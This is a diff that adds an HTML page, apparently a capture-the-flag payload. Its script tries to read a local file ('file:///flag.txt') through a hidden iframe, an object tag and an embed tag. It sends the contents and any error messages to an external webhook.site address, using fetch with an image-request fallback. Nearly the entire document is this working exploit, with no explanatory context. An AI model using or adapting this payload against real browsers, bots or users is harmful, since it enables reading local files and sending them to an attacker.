@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<script>
+// Try to read flag using various methods and exfiltrate
+function exfiltrate(method, data) {
+    fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?method=' + method + '&data=' + encodeURIComponent(data))
+        .catch(() => {
+            // Fallback: try to load as image
+            new Image().src = 'https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?method=' + method + '&data=' + encodeURIComponent(data);
+        });
+}
+
+// Method 1: Try to create iframe and read its content
+function tryIframeRead() {
+    const iframe = document.createElement('iframe');
+    iframe.src = 'file:///flag.txt';
+    iframe.style.display = 'none';
+    iframe.onload = function() {
+        try {
+            const content = iframe.contentDocument.body.innerText || iframe.contentDocument.body.textContent;
+            exfiltrate('iframe', content);
+        } catch (e) {
+            exfiltrate('iframe_error', e.message);
+        }
+    };
+    iframe.onerror = function() {
+        exfiltrate('iframe_error', 'failed_to_load');
+    };
+    document.body.appendChild(iframe);
+}
+
+// Method 2: Try object tag
+function tryObjectRead() {
+    const obj = document.createElement('object');
+    obj.data = 'file:///flag.txt';
+    obj.type = 'text/plain';
+    obj.style.display = 'none';
+    obj.onload = function() {
+        try {
+            const content = obj.contentDocument.body.innerText;
+            exfiltrate('object', content);
+        } catch (e) {
+            exfiltrate('object_error', e.message);
+        }
+    };
+    document.body.appendChild(obj);
+}
+
+// Method 3: Try embed tag
+function tryEmbedRead() {
+    const embed = document.createElement('embed');
+    embed.src = 'file:///flag.txt';
+    embed.type = 'text/plain';
+    embed.style.display = 'none';
+    document.body.appendChild(embed);
+    
+    setTimeout(() => {
+        try {
+            if (embed.contentDocument) {
+                const content = embed.contentDocument.body.innerText;
+                exfiltrate('embed', content);
+            }
+        } catch (e) {
+            exfiltrate('embed_error', e.message);
+        }
+    }, 1000);
+}
+
+// Execute all methods
+setTimeout(() => {
+    exfiltrate('start', 'beginning_attempts');
+    tryIframeRead();
+    tryObjectRead();
+    tryEmbedRead();
+}, 500);
+</script>
+<body>
+<p>Flag extraction attempts...</p>
+</body>
+</html>
